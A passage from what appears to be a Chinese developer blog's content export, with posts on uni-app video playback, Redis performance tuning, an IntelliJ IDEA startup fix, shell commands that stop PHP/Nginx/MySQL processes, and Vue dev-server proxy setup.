<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">let</span> wv = plus.webview.create(<span class="string">&quot;&quot;</span>,<span class="string">&quot;custom-webview&quot;</span>,&#123;</span><br><span class="line">   <span class="attr">plusrequire</span>:<span class="string">&quot;none&quot;</span>, <span class="comment">// 禁止远程网页使用plus的API，有些使用mui制作的网页可能会监听plus.key，造成关闭页面混乱，可以通过这种方式禁止</span></span><br><span class="line">   <span class="string">&#x27;uni-app&#x27;</span>: <span class="string">&#x27;none&#x27;</span>, <span class="comment">// 不加载uni-app渲染层框架，避免样式冲突</span></span><br><span class="line">   <span class="attr">top</span>: uni.getSystemInfoSync().statusBarHeight <span class="comment">// 放置在titleNView下方。如果还想在webview上方加个地址栏的什么的，可以继续降低TOP值</span></span><br><span class="line"> &#125;)</span><br><span class="line"></span><br><span class="line"> wv.loadURL(<span class="string">&#x27;视频解析地址&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 设置webview样式</span></span><br><span class="line"> wv.setStyle(&#123;</span><br><span class="line">   <span class="attr">height</span>: uni.getSystemInfoSync().windowHeight - uni.getSystemInfoSync().statusBarHeight,</span><br><span class="line">   <span class="comment">// 全屏设置, android可以横屏，ios无法横屏</span></span><br><span class="line">   <span class="attr">videoFullscreen</span>: <span class="string">&#x27;landscape&#x27;</span>,</span><br><span class="line">   <span class="comment">// 透明webview背景</span></span><br><span class="line">   <span class="attr">backButtonAutoControl</span>: <span class="string">&#x27;none&#x27;</span>,</span><br><span class="line">   <span class="attr">background</span>: <span class="string">&quot;transparent&quot;</span>,</span><br><span class="line">   <span class="comment">// 进度条颜色</span></span><br><span class="line">   <span class="attr">progress</span>: &#123;</span><br><span class="line">     <span class="attr">color</span>: <span class="string">&#x27;#F9D147&#x27;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前页面的webview对象，非nvue页面可以使用 this.$scope.$getAppWebview()</span></span><br><span class="line"> <span class="keyword">var</span> currentWebview = plus.webview.currentWebview()</span><br><span class="line"> currentWebview.append(wv)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 添加监听时间</span></span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   wv = currentWebview.children()</span><br><span class="line">   <span class="comment">// 添加加载中监听</span></span><br><span class="line">   wv[<span class="number">0</span>].addEventListener(<span class="string">&quot;loading&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&#x27;loading&#x27;</span>)</span><br><span class="line">   &#125;,<span class="literal">false</span>)</span><br><span class="line">   <span class="comment">// 添加加载完成监听</span></span><br><span class="line">   wv[<span class="number">0</span>].addEventListener(<span class="string">&quot;loaded&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&#x27;loaded&#x27;</span>)</span><br><span class="line">   &#125;)</span><br><span class="line"> &#125;, <span class="number">600</span>)</span><br></pre></td></tr></table></figure>

<h3 id="H5-播放m3u8格式视频"><a href="#H5-播放m3u8格式视频" class="headerlink" title="H5 播放m3u8格式视频"></a>H5 播放m3u8格式视频</h3><p>创建<code>index.html</code>模版</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">            &lt;%= htmlWebpackPlugin.options.title %&gt;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Open Graph data --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;meta property=&quot;og:title&quot; content=&quot;Title Here&quot; /&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;meta property=&quot;og:url&quot; content=&quot;http://www.example.com/&quot; /&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;meta property=&quot;og:image&quot; content=&quot;http://example.com/image.jpg&quot; /&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;meta property=&quot;og:description&quot; content=&quot;Description Here&quot; /&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> coverSupport = <span class="string">&#x27;CSS&#x27;</span> <span class="keyword">in</span> <span class="built_in">window</span> &amp;&amp; <span class="keyword">typeof</span> CSS.supports === <span class="string">&#x27;function&#x27;</span> &amp;&amp; (CSS.supports(<span class="string">&#x27;top: env(a)&#x27;</span>) || CSS.supports(<span class="string">&#x27;top: constant(a)&#x27;</span>))</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&#x27;</span> + (coverSupport ? <span class="string">&#x27;, viewport-fit=cover&#x27;</span> : <span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;&quot; /&gt;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;static/index.&lt;%= VUE_APP_INDEX_CSS_HASH %&gt;.css&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/video.js/7.11.1/video-js.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/video.js/7.11.1/video.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">strong</span>&gt;</span>Please enable JavaScript to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<code>manifest.json</code>设置创建的H5模版</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;h5&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;template&quot;</span> : <span class="string">&quot;index.html&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建video容器</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span></span></span><br><span class="line"><span class="tag">  <span class="attr">class</span>=<span class="string">&quot;video-js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;video&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ref</span>=<span class="string">&quot;video&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加video播放器</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建video元素</span></span><br><span class="line"><span class="keyword">let</span> video = <span class="built_in">document</span>.createElement(<span class="string">&#x27;video&#x27;</span>)</span><br><span class="line">video.id = <span class="string">&#x27;video&#x27;</span></span><br><span class="line">video.style = <span class="string">&#x27;width: 100%; height: 100%;&#x27;</span></span><br><span class="line">video.controls = <span class="literal">false</span>;</span><br><span class="line">video.setAttribute(<span class="string">&#x27;playsinline&#x27;</span>, <span class="literal">true</span>) <span class="comment">//IOS微信浏览器支持小窗内播放</span></span><br><span class="line">video.setAttribute(<span class="string">&#x27;webkit-playsinline&#x27;</span>, <span class="literal">true</span>) <span class="comment">//这个bai属性是ios 10中设置可以让视频在小du窗内播放，也就是不是全zhi屏播放的video标签的一个属性</span></span><br><span class="line">video.setAttribute(<span class="string">&#x27;x5-video-player-type&#x27;</span>, <span class="string">&#x27;h5&#x27;</span>) <span class="comment">//安卓 声明启用同层H5播放器 可以在video上面加东西</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> source = <span class="built_in">document</span>.createElement(<span class="string">&#x27;source&#x27;</span>)</span><br><span class="line">source.src = <span class="string">&#x27;视频播放地址&#x27;</span></span><br><span class="line">source.type = <span class="string">&#x27;application/x-mpegURL&#x27;</span></span><br><span class="line"></span><br><span class="line">video.appendChild(source);</span><br><span class="line"><span class="built_in">this</span>.$refs.video.$el.appendChild(video);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> that = <span class="built_in">this</span></span><br><span class="line"><span class="built_in">this</span>.player = videojs(<span class="string">&#x27;video&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">poster</span>: <span class="string">&#x27;poster.png&#x27;</span>, <span class="comment">// 视频封面图地址</span></span><br><span class="line">  <span class="attr">title</span>: <span class="string">&#x27;视频标题&#x27;</span>,</span><br><span class="line">  <span class="attr">playbackRates</span>: [<span class="number">0.7</span>, <span class="number">1.0</span>, <span class="number">1.5</span>, <span class="number">2.0</span>], <span class="comment">//播放速度</span></span><br><span class="line">  <span class="attr">autoDisable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">preload</span>: <span class="string">&#x27;none&#x27;</span>, <span class="comment">// auto - 当页面加载后载入整个视频 meta - 当页面加载后只载入元数据 none - 当页面加载后不载入视频</span></span><br><span class="line">  <span class="attr">language</span>: <span class="string">&#x27;zh-CN&#x27;</span>,</span><br><span class="line">  <span class="attr">fluid</span>: <span class="literal">true</span>, <span class="comment">// 自适应宽高</span></span><br><span class="line">  <span class="attr">muted</span>: <span class="literal">false</span>, <span class="comment">//  是否静音</span></span><br><span class="line">  <span class="attr">aspectRatio</span>: <span class="string">&#x27;16:9&#x27;</span>, <span class="comment">// 将播放器置于流畅模式，并在计算播放器的动态大小时使用该值。值应该代表一个比例 - 用冒号分隔的两个数字（例如&quot;16:9&quot;或&quot;4:3&quot;）</span></span><br><span class="line">  <span class="attr">controls</span>: <span class="literal">false</span>, <span class="comment">//是否拥有控制条 【默认true】,如果设为false ,那么只能通过api进行控制了。也就是说界面上不会出现任何控制按钮</span></span><br><span class="line">  <span class="attr">autoplay</span>: <span class="literal">true</span>, <span class="comment">//如果true,浏览器准备好时开始回放。 autoplay: &quot;muted&quot;, // //自动播放属性,muted:静音播放</span></span><br><span class="line">  <span class="attr">loop</span>: <span class="literal">true</span>, <span class="comment">// 导致视频一结束就重新开始。 视频播放结束后，是否循环播放</span></span><br><span class="line">  <span class="attr">techOrder</span>: [<span class="string">&quot;html5&quot;</span>], <span class="comment">//播放顺序</span></span><br><span class="line">  <span class="attr">screenshot</span>:<span class="literal">true</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;请求数据时遇到错误&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&#x27;stalled&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;网速失速&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&#x27;play&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;开始播放&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&#x27;pause&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;暂停播放&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&quot;timeupdate&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;播放进度发生变化&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>页面只能存在一个播放器，重新创建时，记得销毁上次的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.player.dispose()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>uniapp</category>
      </categories>
      <tags>
        <tag>uniapp</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis性能优化整理</title>
    <url>/post/33866/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Redis 是基于单线程模型实现的，也就是 Redis 是使用一个线程来处理所有的客户端请求的，尽管 Redis 使用了非阻塞式 IO，并且对各种命令都做了优化（大部分命令操作时间复杂度都是 O(1)），但由于 Redis 是单线程执行的特点，因此它对性能的要求更加苛刻。</p>
<span id="more"></span>

<h3 id="开启-lazy-free-特性"><a href="#开启-lazy-free-特性" class="headerlink" title="开启 lazy free 特性"></a>开启 lazy free 特性</h3><p>lazy free 特性是 Redis 4.0 新增的一个非常使用的功能，它可以理解为惰性删除或延迟删除。意思是在删除的时候提供异步延时释放键值的功能，把键值释放操作放在 BIO(Background I/O) 单独的子线程处理中，以减少删除删除对 Redis 主线程的阻塞，可以有效地避免删除 big key 时带来的性能和可用性问题。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">lazyfree-lazy-eviction no</span><br><span class="line">lazyfree-lazy-expire no</span><br><span class="line">lazyfree-lazy-server-del no</span><br><span class="line">slave-lazy-flush no</span><br></pre></td></tr></table></figure>

<ul>
<li>lazyfree-lazy-eviction：表示当 Redis 运行内存超过 maxmeory 时，是否开启 lazy free 机制删除；</li>
<li>lazyfree-lazy-expire：表示设置了过期时间的键值，当过期之后是否开启 lazy free 机制删除；</li>
<li>lazyfree-lazy-server-del：有些指令在处理已存在的键时，会带有一个隐式的 del 键的操作，比如 rename 命令，当目标键已存在，Redis 会先删除目标键，如果这些目标键是一个 big key，就会造成阻塞删除的问题，此配置表示在这种场景中是否开启 lazy free 机制删除；</li>
<li>slave-lazy-flush：针对 slave(从节点) 进行全量数据同步，slave 在加载 master 的 RDB 文件前，会运行 flushall 来清理自己的数据，它表示此时是否开启 lazy free 机制删除。</li>
</ul>
<p>开启其中的 lazyfree-lazy-eviction、lazyfree-lazy-expire、lazyfree-lazy-server-del 等配置，这样就可以有效的提高主线程的执行效率。</p>
<h3 id="使用-slowlog-优化耗时命令"><a href="#使用-slowlog-优化耗时命令" class="headerlink" title="使用 slowlog 优化耗时命令"></a>使用 slowlog 优化耗时命令</h3><p>可以使用 slowlog 功能找出最耗时的 Redis 命令进行相关的优化，以提升 Redis 的运行速度，慢查询有两个重要的配置项：</p>
<ul>
<li>slowlog-log-slower-than ：用于设置慢查询的评定时间，也就是说超过此配置项的命令，将会被当成慢操作记录在慢查询日志中，它执行单位是微秒 (1 秒等于 1000000 微秒)；</li>
<li>slowlog-max-len ：用来配置慢查询日志的最大记录数。</li>
</ul>
<p>可以根据实际的业务情况进行相应的配置，其中慢日志是按照插入的顺序倒序存入慢查询日志中，可以使用 slowlog get n 来获取相关的慢查询日志，再找到这些慢查询对应的业务进行相关的优化。</p>
<h3 id="使用-Pipeline-批量操作数据"><a href="#使用-Pipeline-批量操作数据" class="headerlink" title="使用 Pipeline 批量操作数据"></a>使用 Pipeline 批量操作数据</h3><p>Pipeline (管道技术) 是客户端提供的一种批处理技术，用于一次处理多个 Redis 命令，从而提高整个交互的性能。</p>
<h3 id="避免大量数据同时失效"><a href="#避免大量数据同时失效" class="headerlink" title="避免大量数据同时失效"></a>避免大量数据同时失效</h3><p>Redis 过期键值删除使用的是贪心策略，它每秒会进行 10 次过期扫描，此配置可在 redis.conf 进行配置，默认值是 hz 10，Redis 会随机抽取 20 个值，删除这 20 个键中过期的键，如果过期 key 的比例超过 25% ，重复执行此流程。</p>
<p>如果在大型系统中有大量缓存在同一时间同时过期，那么会导致 Redis 循环多次持续扫描删除过期字典，直到过期字典中过期键值被删除的比较稀疏为止，而在整个执行过程会导致 Redis 的读写出现明显的卡顿，卡顿的另一种原因是内存管理器需要频繁回收内存页，因此也会消耗一定的 CPU。<br>为了避免这种卡顿现象的产生，我们需要预防大量的缓存在同一时刻一起过期，就简单的解决方案就是在过期时间的基础上添加一个指定范围的随机数。</p>
<h3 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h3><p>尽量使用 Redis 连接池，而不是频繁创建销毁 Redis 连接，这样就可以减少网络传输次数和减少了非必要调用指令。</p>
<h3 id="限制-Redis-内存大小"><a href="#限制-Redis-内存大小" class="headerlink" title="限制 Redis 内存大小"></a>限制 Redis 内存大小</h3><p>在 64 位操作系统中 Redis 的内存大小是没有限制的，也就是配置项 <code>maxmemory &lt;bytes&gt;</code> 是被注释掉的，这样就会导致在物理内存不足时，使用 swap 空间既交换空间，而当操心系统将 Redis 所用的内存分页移至 swap 空间时，将会阻塞 Redis 进程，导致 Redis 出现延迟，从而影响 Redis 的整体性能。</p>
<p>因此需要限制 Redis 的内存大小为一个固定的值，当 Redis 的运行到达此值时会触发内存淘汰策略，内存淘汰策略在 Redis 4.0 之后有 8 种：</p>
<ul>
<li>noeviction：不淘汰任何数据，当内存不足时，新增操作会报错，Redis 默认内存淘汰策略；</li>
<li>allkeys-lru：淘汰整个键值中最久未使用的键值；</li>
<li>allkeys-random：随机淘汰任意键值;</li>
<li>volatile-lru：淘汰所有设置了过期时间的键值中最久未使用的键值；</li>
<li>volatile-random：随机淘汰设置了过期时间的任意键值；</li>
<li>volatile-ttl：优先淘汰更早过期的键值。</li>
</ul>
<p>在 Redis 4.0 版本中又新增了 2 种淘汰策略：</p>
<ul>
<li>volatile-lfu：淘汰所有设置了过期时间的键值中，最少使用的键值；</li>
<li>allkeys-lfu：淘汰整个键值中最少使用的键值。</li>
</ul>
<p>其中 allkeys-xxx 表示从所有的键值中淘汰数据，而 volatile-xxx 表示从设置了过期键的键值中淘汰数据。<br>可以根据实际的业务情况进行设置，默认的淘汰策略不淘汰任何数据，在新增时会报错。</p>
<h3 id="混合持久化"><a href="#混合持久化" class="headerlink" title="混合持久化"></a>混合持久化</h3><p>Redis 的持久化策略是将内存数据复制到硬盘上，这样才可以进行容灾恢复或者数据迁移，但维护此持久化的功能，需要很大的性能开销。<br>在 Redis 4.0 之后，Redis 有 3 种持久化的方式：</p>
<ul>
<li>RDB（Redis DataBase，快照方式）将某一个时刻的内存数据，以二进制的方式写入磁盘；</li>
<li>AOF（Append Only File，文件追加方式），记录所有的操作命令，并以文本的形式追加到文件中；</li>
<li>混合持久化方式，Redis 4.0 之后新增的方式，混合持久化是结合了 RDB 和 AOF 的优点，在写入的时候，先把当前的数据以 RDB 的形式写入文件的开头，再将后续的操作命令以 AOF 的格式存入文件，这样既能保证 Redis 重启时的速度，又能减低数据丢失的风险。</li>
</ul>
<p>RDB 和 AOF 持久化各有利弊，RDB 可能会导致一定时间内的数据丢失，而 AOF 由于文件较大则会影响 Redis 的启动速度，为了能同时拥有 RDB 和 AOF 的优点，Redis 4.0 之后新增了混合持久化的方式，因此我们在必须要进行持久化操作时，应该选择混合持久化的方式。<br>查询是否开启混合持久化可以使用 <code>config get aof-use-rdb-preamble</code> 命令</p>
<h3 id="禁用-THP-特性"><a href="#禁用-THP-特性" class="headerlink" title="禁用 THP 特性"></a>禁用 THP 特性</h3><p>Linux kernel 在 2.6.38 内核增加了 Transparent Huge Pages (THP) 特性 ，支持大内存页 2MB 分配，默认开启。<br>当开启了 THP 时，fork 的速度会变慢，fork 之后每个内存页从原来 4KB 变为 2MB，会大幅增加重写期间父进程内存消耗。同时每次写命令引起的复制内存页单位放大了 512 倍，会拖慢写操作的执行时间，导致大量写操作慢查询。例如简单的 incr 命令也会出现在慢查询中，因此 Redis 建议将此特性进行禁用，禁用方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> never &gt;  /sys/kernel/mm/transparent_hugepage/enabled</span><br></pre></td></tr></table></figure>


<p>为了使机器重启后 THP 配置依然生效，可以在 <code>/etc/rc.local</code> 中追加 <code>echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</code>。</p>
<h3 id="使用分布式架构"><a href="#使用分布式架构" class="headerlink" title="使用分布式架构"></a>使用分布式架构</h3><p>Redis 分布式架构有三个重要的手段：</p>
<ul>
<li>主从同步</li>
<li>哨兵模式</li>
<li>Redis Cluster 集群</li>
</ul>
<p>使用主从同步功能我们可以把写入放到主库上执行，把读功能转移到从服务上，因此就可以在单位时间内处理更多的请求，从而提升的 Redis 整体的运行速度。</p>
<p>而哨兵模式是对于主从功能的升级，但当主节点奔溃之后，无需人工干预就能自动恢复 Redis 的正常使用。</p>
<p>Redis Cluster 是 Redis 3.0 正式推出的，Redis 集群是通过将数据库分散存储到多个节点上来平衡各个节点的负载压力。</p>
<p>Redis Cluster 采用虚拟哈希槽分区，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：slot = CRC16(key) &amp; 16383，每一个节点负责维护一部分槽以及槽所映射的键值数据。这样 Redis 就可以把读写压力从一台服务器，分散给多台服务器了，因此性能会有很大的提升。</p>
<p>在这三个功能中，只需要使用一个就行了，毫无疑问 Redis Cluster 应该是首选的实现方案，它可以把读写压力自动的分担给更多的服务器，并且拥有自动容灾的能力。</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA无法正常启动</title>
    <url>/post/35800/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>以前都是用的破解版，今天想支持一下正版，到官网下载了最新版的IDEA，安装成功后发现无法正常启动，记录一下本次发现的坑</p>
<span id="more"></span>

<h3 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h3><p>将 <code>/Applications/IntelliJ IDEA.app/Contents/MacOS/idea</code> 文件拖到命令行，观察日志输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error opening zip file or JAR manifest missing : /Applications/IntelliJ IDEA.app/Contents/lib/jetbrains-agent.jar</span><br><span class="line">Error occurred during initialization of VM</span><br><span class="line">agent library failed to init: instrument</span><br></pre></td></tr></table></figure>

<p>通过错误得知，是该lib目录下缺少了一个文件，官网下载的包里是没有包含这个文件的所以无法读取</p>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>应该是以前下载的破解版导致的，破解版里面包含这个文件，官网的版本覆盖后这个文件就不存在了</p>
<ul>
<li>找到 <code>/Library/Application Support/JetBrains</code> 目录</li>
<li>找到当前版本的目录，我的是 <code>IntelliJIdea2020.2</code></li>
<li>打开 <code>idea.vmoptions</code> 文件，删除有关 <code>jetbrains-agent.jar</code> 文件的这一条</li>
</ul>
<p>通过以上方法解决后，就可以顺利打开软件了，如果之前使用过破解版就可能有此类问题，如果不了解的话还是会浪费很多时间的</p>
]]></content>
      <categories>
        <category>开发环境</category>
      </categories>
      <tags>
        <tag>开发环境</tag>
      </tags>
  </entry>
  <entry>
    <title>关闭所有PHP Nginx Mysql进程</title>
    <url>/post/40230/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>有时需要关闭程序的所有进程</p>
<span id="more"></span>

<h3 id="关闭PHP进程"><a href="#关闭PHP进程" class="headerlink" title="关闭PHP进程"></a>关闭PHP进程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> $(ps aux | grep <span class="string">&#x27;[p]hp&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="关闭Nginx进程"><a href="#关闭Nginx进程" class="headerlink" title="关闭Nginx进程"></a>关闭Nginx进程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> $(ps aux | grep <span class="string">&#x27;[n]ginx&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="关闭Mysql进程"><a href="#关闭Mysql进程" class="headerlink" title="关闭Mysql进程"></a>关闭Mysql进程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> $(ps aux | grep <span class="string">&#x27;[m]ysql&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>vue配置跨域代理</title>
    <url>/post/42883/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果前端应用和后端 API 服务器没有运行在同一个主机上，需要在开发环境下将 API 请求代理到 API 服务器。这个问题可以通过 vue.config.js 中的 devServer.proxy 选项来配置。</p>
<span id="more"></span>

<h3 id="vue-config-js"><a href="#vue-config-js" class="headerlink" title="vue.config.js"></a>vue.config.js</h3><p><code>vue.config.js</code> 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue/cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。</p>
<p>这个文件应该导出一个包含了选项的对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// 选项...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="devServer-proxy"><a href="#devServer-proxy" class="headerlink" title="devServer.proxy"></a>devServer.proxy</h3><p>devServer.proxy 可以是一个指向开发环境 API 服务器的字符串：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: <span class="string">&#x27;http://localhost:4000&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这会告诉开发服务器将任何未知请求 (没有匹配到静态文件的请求) 代理到<a href="http://localhost:4000。">http://localhost:4000。</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;&lt;url&gt;&#x27;</span>,</span><br><span class="line">        <span class="attr">ws</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">        <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;/foo&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;&lt;other_url&gt;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更多的代理控制行为，也可以使用一个 path: options 成对的对象。完整的选项可以查阅 <a href="https://github.com/chimurai/http-proxy-middleware#proxycontext-config">http-proxy-middleware</a> 。</p>
